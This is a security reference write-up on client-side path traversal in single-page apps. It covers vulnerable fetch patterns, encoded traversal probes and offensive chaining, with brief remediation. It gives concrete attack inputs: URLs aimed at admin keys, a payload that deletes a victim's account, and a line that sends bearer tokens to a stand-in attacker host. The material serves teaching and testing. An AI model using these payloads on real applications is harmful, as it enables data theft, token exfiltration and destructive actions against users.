# Mechanism: Client-Side Path Traversal (CSPT) & DOM Routing Flaws

## 1. Architectural Vulnerability Profile
*   **Vulnerability Class:** Client-Side Path Traversal (CSPT) / Unsanitized URL Concatenation in Frontend Fetches
*   **STRIDE Category:** Elevation of Privilege, Tampering, Information Disclosure
*   **Trust Boundary Crossed:** Browser DOM / URL Input (`location.hash`, query params) $\rightarrow$ Client-Side JavaScript `fetch()` / `axios()` $\rightarrow$ Internal API Endpoints
*   **Target Architectures:** Modern Single Page Applications (React, Vue, Angular, Next.js) dynamically fetching data based on route parameters.

---

## 2. Core Failure Mechanism

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    actor Victim as Victim Browser
    participant App as Client SPA (React/Vue)
    participant API as Backend REST API

    Note over App: Client-Side Code Vulnerability:<br/>const userId = getParam("id");<br/>fetch("/api/v1/users/" + userId + "/profile");

    Attacker->>Victim: Sends Link: https://target.com/profile?id=../../admin/export_all
    Victim->>App: Loads React Application
    App->>API: Executes fetch("/api/v1/users/../../admin/export_all")
    Note over API: Browser normalizes path to /api/v1/admin/export_all<br/>Sends victim's session cookies automatically!
    API-->>App: Returns Confidential Admin Database Export!
    App-->>Victim: Renders admin data or triggers state mutation
```

---

## 3. High-Signal Recognition Patterns in Front-End Code

Look for these patterns in JavaScript bundles during recon:
```javascript
// Vulnerable Pattern 1: Path concatenation in fetch
fetch(`/api/v2/posts/${location.pathname.split('/')[2]}/comments`)

// Vulnerable Pattern 2: Search parameter concatenation
const query = new URLSearchParams(window.location.search).get("category");
axios.get(`/api/products/${query}/items`)

// Vulnerable Pattern 3: Dynamic translation / locale loader
const lang = getCookie("lang") || "en";
fetch(`/locales/${lang}.json`)
```

---

## 4. Offensive Exploitation & Chaining Paths

### 1. CSPT to Sensitive Data Leakage
*   **Input:** `https://target.com/#/user/..%2f..%2fapi%2fadmin%2fkeys`
*   **Result:** Application loads sensitive admin configuration or keys into the user's DOM context.

### 2. CSPT + Method Override $\rightarrow$ 1-Click State Mutation (Client-Side CSRF)
*   If the frontend executes a `POST` or `DELETE` request with user-controlled path:
    ```javascript
    fetch(`/api/v1/drafts/${draftId}`, { method: 'DELETE' })
    ```
*   **Payload:** `draftId = "../../account"` $\rightarrow$ Triggers `DELETE /api/v1/account` using victim's authenticated session!

### 3. CSPT to Open Redirect / Token Exfiltration
*   If the frontend dynamic path permits navigating outside the API root:
    *   `lang = "@attacker.com/evil"` $\rightarrow$ `fetch('https://target.com/@attacker.com/evil.json')`
    *   Sends Authorization bearer headers to attacker-controlled server.

---

## 5. Offensive Testing Methodology

1. **Static Analysis of JS:** Search for `fetch(`, `axios(`, `XMLHttpRequest` where the URL is constructed with template literals (`` `/api/.../${var}` ``).
2. **Dynamic URL Probing:** Inject traversal sequences into path segments and query parameters:
   - `..%2f`
   - `%2e%2e%2f`
   - `..%252f`
   - `/%2e%2e/`
3. **Monitor Network Tab in DevTools:** Watch if the outgoing API request navigates to unexpected endpoints (`/api/v1/admin/...` instead of `/api/v1/public/...`).

---

## 6. Remediation & Defense
1. **Never Concatenate Raw Client Input into API URLs:** Use strict allowlisting or identifier mapping:
   ```javascript
   // Secure: Ensure ID contains only alphanumeric characters or UUID regex
   if (!/^[a-zA-Z0-9_-]+$/.test(id)) throw new Error("Invalid ID");
   ```
2. **Use Relative Path Resolvers Safely:** Avoid trusting `window.location` without sanitization.
